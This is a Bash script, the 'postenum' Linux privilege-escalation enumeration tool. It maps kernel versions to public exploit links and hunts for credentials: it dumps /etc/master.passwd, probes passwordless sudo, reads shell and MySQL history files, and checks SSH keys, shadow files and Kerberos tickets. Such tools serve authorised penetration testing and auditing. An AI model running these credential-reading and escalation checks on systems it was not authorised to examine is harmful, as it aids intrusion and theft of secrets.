#!/bin/bash
clear

# License: MIT

# Version 0.8

# Postenum is a clean, nice and easy tool for basic/advanced privilege escalation techniques. Postenum tool is intended to be executed locally on a Linux box.
# A tool to increase the chance of success (Get Root), using different old/new tricks, techniques, approaches, and exploits, in the world of hacking/pentration testing.
# Be more than a normal user. be the ROOT.

# CHANGELOGS
# Version 0.8
# - Replace the non-standard 'which' with the builtin command 'command -v'
# - Replace the legacy backticked `..` with the notation $(..)
# - Replace 'ls' directories with for loops
# - Udev vulnerable version check
# - List all environments variables and list available shells
# - Gdb shell escape
# - World-writable files (directories already exist)
# - Hidden files and clear-text passowrd/pass check
# - Accessible .rhosts files
# - Installation script for system/network admins (hard symbolic link)
# - List NFS shares and permisisons
# - Process binaries and umask check
# - Better code and more..
# - Next

# Version 0.7
# - Check java and exim vulnerable versions
# - Display the content of passwd.master file (BSD)
# - SElinux status
# - Check for the existence of Kerberos tickets and GPG keys
# - Sensitive logfiles owned by root - readable ?
# - Shell escape - [nmap without --interactive option, man command, vim and vi]
# - List files based on their Internet address
# - CPU information
# - New exploits from 2018/2019
# - Solved some errors
# - Next

# Version 0.6
# - Added search on config and db files on /var/ (using -s option)
# - Exploit's guesses for linux kernel (using -o option)
# - Next

# Version 0.5
# - Added pkexec vulnerable version check, and re-write /root and /home/* history files checking (using -v option)
# - Added new feature based on SUID tools (less, cat, more, vim.basic, tail, head)  to read/write root files (using -s option) 
# - The banner changed
# - Next

# Version 0.4
# - Added features such as passwd, shadow (backups files) checks and more..
# - Solved the previous errors... 
# - Modified the whole -v option to avoid errors and to display the correct versions
# - Next

# Version 0.3
# - Added command to display crontab contents and a check for list user's crontab 
# - Next

# Version 0.2
# - A new title - shell escape [./postenum -l]
# - Edited the development tools as well as the way to extract version from applications/services
# - Next

# Version 0.1
# - It's the first time that we release our tool
# - Next

# variables
white=$'\e[0m'
blu=$'\e[0;94m'
cyan=$'\e[0;96m'
boldgrn=$'\e[1;92m'
yellowintensy=$'\e[0;93m'
grnintensy=$'\e[0;92m'
whiteboldintensy=$'\e[1;97m'
redintensy=$'\e[0;91m'

echo $whiteboldintensy"--------------------------------------------------------------------------"
echo "
                 _                             
 _ __   ___  ___| |_ ___ _ __  _   _ _ __ ___  
| '_ \ / _ \/ __| __/ _ \ '_ \| | | | '_ ' _ \ 
| |_) | (_) \__ \ ||  __/ | | | |_| | | | | | |  version : 0.8
| .__/ \___/|___/\__\___|_| |_|\__,_|_| |_| |_|
|_| 

"$white
echo "POST-ENUMERATION$grnintensy by mbahadou"$white
echo $whiteboldintensy"--------------------------------------------------------------------------"$white
echo ""
echo " postenum - be the ROOT"
echo " For help or reporting issues, visit https://github.com/mbahadou/postenum"
echo ""

function DirtyCow(){
	echo "$redintensy Linux Kernel 2.6.22 < 3.9 Dirty Cow$white - https://www.exploit-db.com/exploits/40839"
	echo "$redintensy Linux Kernel 2.6.22 < 3.9 Dirty Cow (x86-x64)$white - https://www.exploit-db.com/exploits/40616"
}

function Exploits1x(){
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
}

function Exploits2x(){
	echo "$redintensy Linux Kernel 2.4.x/2.6.x$white - https://www.exploit-db.com/exploits/9545"
	echo "$redintensy UDEV < 1.4.1 (1)$white - https://www.exploit-db.com/exploits/8478"
	echo "$redintensy UDEV < 1.4.1 (2)$white - https://www.exploit-db.com/exploits/8572"
	echo "$redintensy UDEV < 1.4.1 (Metasploit)$white - https://www.exploit-db.com/exploits/21848"	
	echo "$redintensy Linux Kernel 2.6 < 2.6.19$white - https://www.exploit-db.com/exploits/9542"
	echo "$redintensy Linux Kernel 2.6.0 < 2.6.31(1)$white - https://www.exploit-db.com/exploits/33321"
	echo "$redintensy Linux Kernel 2.6.x (2)$white - https://www.exploit-db.com/exploits/33322"
	echo "$redintensy Linux Kernel 2.6.x$white - https://www.exploit-db.com/exploits/30604"
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 Gentoo / Ubuntu x86-x64 Mempodipper(1)$white - https://www.exploit-db.com/exploits/18411"
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 x86-x64 Mempodipper(2)$white - https://www.exploit-db.com/exploits/35161"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
}

function Exploits3x(){
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 Gentoo / Ubuntu x86-x64 Mempodipper(1)$white - https://www.exploit-db.com/exploits/18411"
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 x86-x64 Mempodipper(2)$white - https://www.exploit-db.com/exploits/35161"
	echo "$redintensy Linux Kernel 3.7.6 (RedHat x86/x64)$white - https://www.exploit-db.com/exploits/27297"
	echo "$redintensy Linux Kernel 3.13 < 3.19 Ubuntu 12.04/14.04/14.10/15.04$white - https://www.exploit-db.com/exploits/37292"
	echo "$redintensy Linux Kernel 3.13 SGID$white - https://www.exploit-db.com/exploits/33824"
	echo "$redintensy Linux Kernel 3.13.1 (Metasploit)$white - https://www.exploit-db.com/exploits/40503"
	echo "$redintensy Linux Kernel 3.14.5 (CentOS 7 / RHEL)$white - https://www.exploit-db.com/exploits/35370"
	echo "$redintensy Linux Kernel 3.x (Ubuntu 14.04/Mint 17.3/Fedora 22)$white https://www.exploit-db.com/exploits/41999"
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
}

function Exploits4x(){
	echo "$redintensy Linux Kernel 4.3.3 Overlayfs$white - https://www.exploit-db.com/exploits/39230"
	echo "$redintensy Linux Kernel 4.3.3 (Ubuntu 14.04/15.10)$white - https://www.exploit-db.com/exploits/39166"
	echo "$redintensy Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64)$white - https://www.exploit-db.com/exploits/40871"
	echo "$redintensy Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64)$white - https://www.exploit-db.com/exploits/47170"
	echo "$redintensy Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04)$white - https://www.exploit-db.com/exploits/43418"
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux Kernel 4.4.1$white - https://www.exploit-db.com/exploits/40003"
	echo "$redintensy Linux Kernel 4.8.0 (UDEV < 232) - https://www.exploit-db.com/exploits/41886"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel 4.13 (Debian 9)$white - https://www.exploit-db.com/exploits/44303"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
	echo "$redintensy Linux Kernel 4.14.0-rc4+$white - https://www.exploit-db.com/exploits/43029"
	echo "$redintensy Linux Kernel 4.15.x < 4.19.2 (polkit Method)$white - https://www.exploit-db.com/exploits/47167"
	echo "$redintensy Linux Kernel 4.15.x < 4.19.2 (cron Method)$white - https://www.exploit-db.com/exploits/47164"
	echo "$redintensy Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
}

function Exploits5x(){
	echo "$redintensy Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
}

function OperatingSystem(){
	echo $boldgrn"[-] OPERATING SYSTEM"$white
	echo $cyan"[+] - Check current user and group information"$white
	ID=$(id 2>/dev/null)
	if [ "$ID" ];
	then
		echo $yellowintensy"[x] The current user and group information:"$white
		echo -e "$ID\n"
	else
		:
	fi

	WHOAMI=$(whoami 2>/dev/null)
	if [ "$WHOAMI" ];
	then
		echo $yellowintensy"[x] The current user:"$white
		echo "$WHOAMI"
	else
		:
	fi
	echo ""

	RELEASE=$(cat /etc/*-release 2>/dev/null)
	if [ "$RELEASE" ];
	then
		echo $cyan"[+] - Check distribution type and version number"$white
		echo $yellowintensy"[x] The distribution type and version:"$white
		echo "$RELEASE"
	else
		:
	fi 
	echo ""

	CPUINFO=$(lscpu 2>/dev/null)
	if [ "$CPUINFO" ];
	then
		echo $cyan"[+] - CPU information"$white
		echo $yellowintensy"[x] CPU architecture information from sysfs and /proc/cpuinfo:"$white
		echo "$CPUINFO"
	else
		:
	fi
	echo""	
		
	echo $cyan"[+] - Check kernel version"$white
	UNAME=$(uname -a 2>/dev/null)
	if [ "$UNAME" ];
	then
		echo $yellowintensy"[x] Kernel version and (32-bit/64-bit):"$white
		echo -e "$UNAME\n"
	else
		:
	fi

	PROCVERSION=$(cat /proc/version 2>/dev/null)
	if [ "$PROCVERSION" ];
	then
		echo $yellowintensy"[x] Kernel version and gcc version used to compile the kernel:"$white
		echo "$PROCVERSION"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Exploits"$white
	underversion2=2.0.0
	kernel=$(uname -a | cut -d " " -f "3" | cut -d "-" -f "1")
	OPERATOR=$(echo "$kernel $underversion2" | awk '{if ($1 < $2) print "2"; else print "3"}')
	if [ "$OPERATOR" == "2" ];
	then
		echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
		echo "Listing the most popular exploits for kernel 4*"
		echo "------------------------------------------------------"
		Exploits1x
		echo -e "\nThe most specific exploits for your kernel $kernel"
		echo "------------------------------------------------------"
		Exploits1x > exploits1.txt
		minimumsize=42
		actualsize=$(wc -c exploits1.txt|cut -d " " -f 1)
		if [ "$actualsize" -ge "$minimumsize" ];
		then
			grep "$kernel" exploits1.txt > exploit.txt
			shred -n 5 -u -z exploits1.txt
			exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
			if [ "$exploitfilesize" -ge "$minimumsize" ];
			then
				cat exploit.txt
				shred -n 5 -u -z exploit.txt
			else
				echo "Nothing extract from exploits, for kernel $kernel"
			fi
		else
			echo "Nothing here! But don't give up."
		fi
	else
		underversion3=3.0.0
		OPERATOR=$(echo "$kernel $underversion3" | awk '{if ($1 < $2) print "3"; else print "4"}')
		if [ "$OPERATOR" == "3" ];
		then
			echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
			echo "Listing the most popular exploits for kernel 4*"
			echo "------------------------------------------------------"
			Exploits3x
			DirtyCow
			echo -e "\nThe most specific exploits for your kernel $kernel"
			echo "------------------------------------------------------"
			Exploits3x > exploits2.txt
			DirtyCow >> exploits2.txt
			minimumsize=42
			actualsize=$(wc -c exploits2.txt|cut -d " " -f 1)
			if [ "$actualsize" -ge "$minimumsize" ];
			then
				grep "$kernel" exploits2.txt > exploit.txt
				shred -n 5 -u -z exploits2.txt
				exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
				if [ "$exploitfilesize" -ge "$minimumsize" ];
				then
					cat exploit.txt
					shred -n 5 -u -z exploit.txt
				else
					echo "Nothing extract from exploits, for kernel $kernel"
				fi
			else
				echo "Nothing here! But don't give up."
			fi
		else
			underversion4=4.0.0
			OPERATOR=$(echo "$kernel $underversion4" | awk '{if ($1 < $2) print "4"; else print "5"}')
			if [ "$OPERATOR" == "4" ];
			then
				echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
				echo "Listing the most popular exploits for kernel 4*"
				echo "------------------------------------------------------"
				Exploits3x
				DirtyCow
				echo -e "\nThe most specific exploits for your kernel $kernel"
				echo "------------------------------------------------------"
				Exploits3x > exploits3.txt
				DirtyCow >> exploits3.txt
				minimumsize=42
				actualsize=$(wc -c exploits3.txt|cut -d " " -f 1)
				if [ "$actualsize" -ge "$minimumsize" ];
				then
					grep "$kernel" exploits3.txt > exploit.txt
					shred -n 5 -u -z exploits3.txt
					exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
					if [ "$exploitfilesize" -ge "$minimumsize" ];
					then
						cat exploit.txt
						shred -n 5 -u -z exploit.txt
					else
						echo "Nothing extract from exploits, for kernel $kernel"
					fi
				else
					echo "Nothing here! But don't give up."
				fi
			else
				underversion5=5.0.0
				OPERATOR=$(echo "$kernel $underversion5" | awk '{if ($1 < $2) print "5"; else print "6"}')
				if [ "$OPERATOR" == "5" ];
				then
					echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
					echo "Listing the most popular exploits for kernel 4*"
					echo "------------------------------------------------------"
					Exploits4x
					echo -e "\nThe most specific exploits for your kernel $kernel"
					echo "------------------------------------------------------"
					Exploits4x > exploits4.txt
					minimumsize=42
					actualsize=$(wc -c exploits4.txt|cut -d " " -f 1)
					if [ "$actualsize" -ge "$minimumsize" ];
					then
						grep "$kernel" exploits4.txt > exploit.txt
						shred -n 5 -u -z exploits4.txt
						exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
						if [ "$exploitfilesize" -ge "$minimumsize" ];
						then
							cat exploit.txt
							shred -n 5 -u -z exploit.txt
						else
							echo "Nothing extract from exploits, for kernel $kernel"
						fi
					else
						echo "Nothing here! But don't give up."
					fi
				else
					underversion6=6.0.0
					OPERATOR=$(echo "$kernel $underversion6" | awk '{if ($1 < $2) print "6"; else print "7"}')
					if [ "$OPERATOR" == "6" ];
					then
						echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
						echo "Listing the most popular exploits for kernel 4*"
						echo "------------------------------------------------------"
						Exploits5x
						echo -e "\nThe most specific exploits for your kernel $kernel"
						echo "------------------------------------------------------"
						Exploits5x > exploits5.txt
						minimumsize=42
						actualsize=$(wc -c exploits5.txt|cut -d " " -f 1)
						if [ "$actualsize" -ge "$minimumsize" ];
						then
							grep "$kernel" exploits5.txt > exploit.txt
							shred -n 5 -u -z exploits5.txt
							exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
							if [ "$exploitfilesize" -ge "$minimumsize" ];
							then
								cat exploit.txt
								shred -n 5 -u -z exploit.txt
							else
								echo "Nothing extract from exploits, for kernel $kernel"
							fi
						else
							echo "Nothing here! But don't give up."
						fi
					else
						echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
						echo $redintensy"Nothing in our database on kernel $kernel. You still need to check using google search."$white
					fi
				fi
			fi
		fi
	fi
	echo ""
}

function AppsAndServices(){
	echo $boldgrn"[-] APPS and SERVICES"$white
	echo $cyan"[+] - Check jobs scheduled"$white
	CRON=$(for x in "/etc"; do ls -l "$x"; done | grep cron 2>/dev/null)
	if [ "$CRON" ];
	then
		echo $yellowintensy"[x] Search on cron in /etc:"$white
		echo -e "$CRON\n"
	else
		:
	fi

	CROND=$(for x in "/etc/cron.d/"; do ls -l "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$CROND"  ];
	then
		echo $yellowintensy"[x] List /etc/cron.d/"$white
		echo -e "$CROND\n"
		echo $yellowintensy"[x] Root's cron jobs:"$white
		crontab -l
	else
		:
	fi
	echo ""

	CRONTAB=$(cat /etc/crontab 2>/dev/null)
	if [ "$CRONTAB"  ];
	then
		echo $yellowintensy"[x] The content of /etc/crontab:"$white
		echo -e "$CRONTAB\n"
	else
		:
	fi

	CRONDAILY=$(for x in "/etc/cron.daily"; do ls -l "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$CRONDAILY" ];
	then
		echo $yellowintensy"[x] View daily cron jobs:"$white
		echo -e "$CRONDAILY\n"
	else
		:
	fi

	CRONDHOURLY=$(for x in "/etc/cron.hourly"; do ls -l "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$CRONDHOURLY" ];
	then
		echo $yellowintensy"[x] View hourly cron jobs:"$white
		echo -e "$CRONDHOURLY\n"
	else
		:
	fi 

	CRONDMONTHLY=$(for x in "/etc/cron.monthly"; do ls -l "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$CRONDMONTHLY" ];
	then
		echo $yellowintensy"[x] View monthly cron jobs:"$white
		echo "$CRONDMONTHLY"
	else
		:
	fi 
	echo ""

	CRONDWEEKLY=$(for x in "/etc/cron.weekly"; do ls -l "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$CRONDWEEKLY" ];
	then
		echo $yellowintensy"[x] View weekly cron jobs:"$white
		echo "$CRONDWEEKLY"
	else
		:
	fi 
	echo ""

	echo $cyan"[+] - Check for running services, and which service(s) are been running by root"$white
	AUX=$(ps aux 2>/dev/null)
	if [ "$AUX" ];
	then
		echo $yellowintensy"[x] Dispaly every process on the system:"$white
		echo -e "$AUX\n"
	else
		:
	fi

	PROCESSBINARY=$(ps aux | awk '{print $11}'| xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null)
	if [ "$PROCESSBINARY" ];
	then
  		echo $yellowintensy"[x] Process binaries and permissions:"$white
  		echo -e "$PROCESSBINARY\n"
  	else
  		:
	fi

	AUXROOT=$(ps aux | grep root 2>/dev/null)
	if [ "$AUXROOT" ];
	then
		echo $yellowintensy"[x] Display every process running by root on the system:"$white
		echo -e "$AUXROOT\n"
	else
		:
	fi

	MYSQL=$(ps aux | grep mysql 2>/dev/null)
	if [ "$MYSQL" ];
	then
		echo $yellowintensy"[x] Is mysql running by root:"$white
		echo $redintensy"$MYSQL"$white
	else
		:
	fi
	echo ""
}

function CommAndNet(){
	echo $boldgrn"[-] COMMUNICATING and NETWORKING"$white
	echo $cyan"[+] - Check NIC(s) does the system have"$white
	IFCONFIG=$(ifconfig -a 2>/dev/null)
	if [ "$IFCONFIG" ];
	then
		echo $yellowintensy"[x] Display all interfaces which are currently available:"$white
		echo -e "$IFCONFIG\n"
	else
		:
	fi

	INTERFACE=$(cat /etc/network/interfaces 2>/dev/null)
	if [ "$INTERFACE" ];
	then
		echo $yellowintensy"[x] Available network interfaces on the system:"$white
		echo -e "$INTERFACE\n"
	else
		:
	fi

	HOST=$(cat /etc/hosts 2>/dev/null)
	if [ "$HOST" ];
	then
		echo $yellowintensy"[x] Hosts:"$white
		echo "$HOST"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check network configuration settings"$white
	RESOLV=$(cat /etc/resolv.conf 2>/dev/null)
	if [ "$RESOLV" ];
	then
		echo $yellowintensy"[x] DNS name servers:"$white
		echo -e "$RESOLV\n"
	else
		:
	fi

	NETWORK=$(cat /etc/networks 2>/dev/null)
	if [ "$NETWORK" ];
	then
		echo $yellowintensy"[x] Networks:"$white
		echo -e "$NETWORK\n"
	else
		:
	fi

	SELinux=$(sestatus 2>/dev/null)
	if [ "$SELinux" ];
	then
		echo $yellowintensy"[x] SELinux enabled - status:"$white
		echo -e "$SELinux\n"
	else
		:
	fi

	IPTABLE=$(iptables -L 2>/dev/null)
	if [ "$IPTABLE" ];
	then
		echo $yellowintensy"[x] Packet filter rules:"$white
		echo -e "$IPTABLE\n"
	else
		:
	fi

	HOSTNAME=$(hostname 2>/dev/null)
	if [ "$HOSTNAME" ];
	then
		echo $yellowintensy"[x] hostname:"$white
		echo -e "$HOSTNAME\n"
	else
		:
	fi

	DNS=$(dnsdomainname 2>/dev/null)
	if [ "$DNS" ];
	then
		echo $yellowintensy"[x] Get DNS domain or the FQDN:"$white
		echo "$DNS"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check users and hosts communicating with the system"$white
	NETSTAT=$(netstat -antup 2>/dev/null)
	if [ "$NETSTAT" ];
	then
		echo $yellowintensy"[x] Display all TCP/UDP connected socket, PID/program:"$white
		echo -e "$NETSTAT\n"
	else
		:
	fi

	LSOF=$(lsof -Pi 2>/dev/null)
	if [ "$LSOF" ];
	then
		echo $yellowintensy"[x] List files based on their Internet address:"$white
		echo -e "$LSOF\n"
	else
		:
	fi

	LAST=$(last 2>/dev/null)
	if [ "$LAST" ];
	then
		echo $yellowintensy"[x] Last logged in users:"$white
		echo -e "$LAST\n"
	else
		:
	fi

	W=$(w 2>/dev/null)
	if [ "$W" ];
	then
		echo $yellowintensy"[x] Who is logged on and what they are doing:"$white
		echo -e "$W"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check cached IP and/or MAC addresses"$white
	ARP=$(arp -a 2>/dev/null)
	if [ "$ARP" ];
	then
		echo $yellowintensy"[x] Display all hosts based on ARP:"$white
		echo -e "$ARP\n"
	else
		:
	fi

	ROUTE=$(route -nee 2>/dev/null)
	if [ "$ROUTE" ];
	then
		echo $yellowintensy"[x] Display IP routing table:"$white
		echo "$ROUTE" 
	else
		:
	fi
	echo ""
}

function ConfidentialInfoAndUser(){
	echo $boldgrn"[-] CONFIDENTIAL INFO and USER"$white
	echo $cyan"[+] - Check list of users and super users"$white
	SUPERUSER1=$(awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null)
	SUPERUSER2=$(grep -v -E "^#" /etc/passwd 2>/dev/null | awk -F: '$3 ==0 { print $1}' 2>/dev/null)
	if [ "$SUPERUSER1" ] || [ "$SUPERUSER2" ];
	then
		echo $yellowintensy"[x] Super user:"$white
		echo "$SUPERUSER1"; echo -e "$SUPERUSER2\n"
	else
		:
	fi

	HOMEUSERS=$(ls -ld /home/*)
	if [ "$HOMEUSERS" ];
	then
		echo $yellowintensy"[x] Useful home users:"$white
		echo -e $redintensy"$HOMEUSERS\n"$white
	else
		:
	fi

	PASSWD=$(cat /etc/passwd grep "/bin/bash\|/bin/sh\|/bin/dash" 2>/dev/null)
	if [ "$PASSWD" ];
	then
		echo $yellowintensy"[x] Anything with /bin/bash /bin/sh /bin/dash:"$white
		echo "$PASSWD"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check /etc for config files (recursive 1 level)"$white
	CHECKETC=$(find /etc/ -maxdepth 1 -name "*.conf" -type f -exec ls -la {} \; 2>/dev/null)
	if [ "$CHECKETC" ];
	then
		echo $yellowintensy"[x] All *.conf files in /etc (recursive 1 level):"$white
		echo -e "$CHECKETC\n"
	else
		:
	fi

	MASTERPASS=$(cat /etc/master.passwd 2>/dev/null)
	if [ "$MASTERPASS" ];
	then
		echo $yellowintensy"[x] Check to see if we can read master.passwd:"$white
		echo $redintensy"[/] Readable - /etc/master.passwd"$white
		echo -e "$MASTERPASS\n"
	else
		:
	fi

	SUDOPASS=$(echo '' | sudo -S -l -k 2>/dev/null)
	if [ "$SUDOPASS" ];
	then
		echo $yellowintensy"[x] Sudo permissions"$white
		echo $redintensy"[/] We can run sudo without supplying a password:"$white
		echo "$SUDOPASS"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check sensitive files"$white
	WRPASS=$(ls -l /etc/passwd 2>/dev/null)
	if [ -w /etc/passwd ];
	then
		echo $redintensy"$WRPASS"$white
	else
		echo "$WRPASS"
	fi

	WXSHADOW=$(ls -l /etc/shadow 2>/dev/null)
	if [ -w /etc/shadow ] || [ -r /etc/shadow ];
	then
		echo $redintensy"$WXSHADOW"$white
	else
		echo "$WXSHADOW"
	fi

	WRGROUP=$(ls -l /etc/group 2>/dev/null)
	if [ -w /etc/group ]; 
	then
		echo $redintensy"$WRGROUP"$white
	else
		echo "$WRGROUP"
	fi

	WRSUDOERS=$(ls -l /etc/sudoers 2>/dev/null)
	if [ -w /etc/sudoers ] || [ -r /etc/sudoers ];
	then
		echo $redintensy"$WRSUDOERS"$white
	else
		echo "$WRSUDOERS"
	fi
	echo ""

	if [ -r /var/backups/passwd.bak ] || [ -r /var/backups/group.bak ] || [ -r /var/backups/shadow.bak ] || [ -r /var/backups/gshadow.bak ];
	then
		echo $cyan"[+] - Check backup files"$white
		BACKUPPASS=$(ls -l /var/backups/passwd.bak 2>/dev/null)
		if [ "$BACKUPPASS" ];
		then
			echo "$BACKUPPASS"
		else
			echo "$BACKUPPASS"
		fi

		BACKUPGROUP=$(ls -l /var/backups/group.bak 2>/dev/null)
		if [ "$BACKUPGROUP"  ];
		then
			echo "$BACKUPGROUP"
		else
			echo "$BACKUPGROUP"
		fi

		BACKUPSHADOW=$(ls -l /var/backups/shadow.bak 2>/dev/null)
		if [ -r /var/backups/shadow.bak ];
		then
			echo $redintensy"$BACKUPSHADOW"$white
		else
			echo "$BACKUPSHADOW"
		fi

		BACKUPGSHADOW=$(ls -l /var/backups/gshadow.bak 2>/dev/null)
		if [ -r /var/backups/gshadow.bak ];
		then
			echo $redintensy"$BACKUPGSHADOW"$white
		else
			echo "$BACKUPGSHADOW"
		fi
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check if anything interesting in the mail directory"$white
	MAILVAR=$(for x in "/var/mail"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ -d /var/mail ];
	then 
		echo $yellowintensy"[x] Interesting mail in /var/mail:"$white
		echo -e "$MAILVAR\n"
	else
		:
	fi

	if [ -e /var/mail/root ];
	then
		echo $yellowintensy"[x] Seems /var/mail/root exist - you can try to read it:"$white
		$redintensy ls -l /var/mail/root | grep -v "total" 2>/dev/null $white
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check if anything interesting in the home/root directories"$white
	ROOTDIR=$(for x in "/root/"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$ROOTDIR" ];
	then
		echo $yellowintensy"[x] Check if /root is accessible:"$white
		echo $redintensy"[/] Root directory can be accessible"$white
		echo -e "$ROOTDIR\n"
	else
		:
	fi

	HOMEDIR=$(for x in "/home/"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$HOMEDIR" ];
	then
		echo $yellowintensy"[x] Interesting /home/* directory:"$white
		echo -e $redintensy"$HOMEDIR\n"$white
	else
		:
	fi

	HOMEHISTORY=$(for x in /home/*/.*_history; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$HOMEHISTORY" ];
	then
		echo $yellowintensy"[x] History files of /home/*/:"$white
		echo -e $redintensy"$HOMEHISTORY\n"$white
	else
		:
	fi

	ROOTHISTORY=$(for x in /root/.*_history; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$ROOTHISTORY" ];
	then
		echo $yellowintensy"[x] History files of /root:"$white
		echo $redintensy"$ROOTHISTORY"$white
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check for plain text password"$white
	if [ -e ~/.bash_history ];
	then
		echo $yellowintensy"[x] ~/.bash_history - snippet below:"$white
		head ~/.bash_history
		echo ""
	else
		echo $blu"~/.bash_history file doesn't exist"$white
	fi

	if [ -e ~/.nano_history ];
	then
		echo $yellowintensy"[x] ~/.nano_history - snippet below:"$white
		head ~/.nano_history
		echo ""
	else
		echo $blu"~/.nano_history file doesn't exist:"$white
	fi

	if [ -e ~/.mysql_history ];
	then
		echo $yellowintensy"[x] ~/.mysql_history - snippet below:"$white
		head ~/.mysql_history
		echo ""
	else
		echo $blu"~/.mysql_history file doesn't exist"$white
	fi

	if [ -e ~/.php_history ];
	then
		echo $yellowintensy"[x] ~/.php_history - snippet below:"$white
		head ~/.php_history
		echo ""
	else
		echo $blu"~/.php_history file doesn't exist"$white
		echo ""
	fi

	echo $cyan"[+] - Check SSH Dir/Files"$white
	echo $yellowintensy"[x] Any private-key info - /home/*/.ssh/:"$white
	for usersshfolder in /home/*/.ssh
	do
	        ls -ld "$usersshfolder"
	        for files in $usersshfolder
	        do
        	        if [ -r "$files" ];
        	        then
                                sshfile=$(ls -l "$files" | grep -v "total" 2>/dev/null)
                                echo $redintensy"$sshfile [READABLE]"$white
        	        else
                                :
        	        fi
        	        echo ""
                done
        done
        echo ""
        
	if [ -d /root/.ssh ];
	then
	        echo $yellowintensy"[x] Any private-key info - /root/.ssh/:"$white
	        ls -ld /root/.ssh/
	        for rootsshfiles in "/root/.ssh"
	        do
		        if [ -r "$rootsshfiles" ];
		        then
			        rootsshfile=$(ls -l "$files" | grep -v "total" 2>/dev/null)
			        echo $redintensy"$rootsshfile [READABLE]"$white
	        	else
					echo $yellowintensy"[x] Any private-key info - /root/.ssh/"$white
					LISTSSHROOT=$(ls -ld /root/.ssh/)
					echo "$LISTSSHROOT"
	   	     	fi
	        done
	else
		:
	fi
	echo ""

	ROOTLOGIN=$(grep "PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print $2}')
	if [ "$ROOTLOGIN" ];
	then
		echo $yellowintensy"Check if PermitRootLogin is on:"$white
		echo $redintensy"[/] Root is allowed to login via SSH"$white
		echo -e "$ROOTLOGIN\n"
	else
		:
	fi
	
	PGPKEY=$(ls -l /home/*/.gnupg/secring.gpgs 2>/dev/null)
	Kerberos1=$(ls -l /tmp/krb5.keytab 2>/dev/null)
	Kerberos2=$(ls -l /tmp/krb5cc_* 2>/dev/null)
	if [ "$PGPKEY" ] || [ "$Kerberos1" ] || [ "$Kerberos2" ];
	then
                echo $cyan"[+] - Check PGP keys and Kerberos tickets"$white
                if [ "$PGPKEY" ];
                then
		        echo $yellowintensy"[x] PGP keys:"$white
		        echo -e $redintensy"$PGPKEY\n"$white
                else
                        :
                fi

                if [ "$Kerberos1" ] || [ "$Kerberos2" ];
                then
                	echo $yellowintensy"[x] Kerberos tickets:"$white
                        if [ "$Kerberos1" ];
	        	then
		        	echo $redintensy"$Kerberos1"$white
	        	else
		        	:
	        	fi

		        if [ "$Kerberos2" ];
	        	then
		        	echo $redintensy"$Kerberos2"$white
	        	else
	        		:
	        	fi
	        fi
	else
		:
	fi
	echo ""

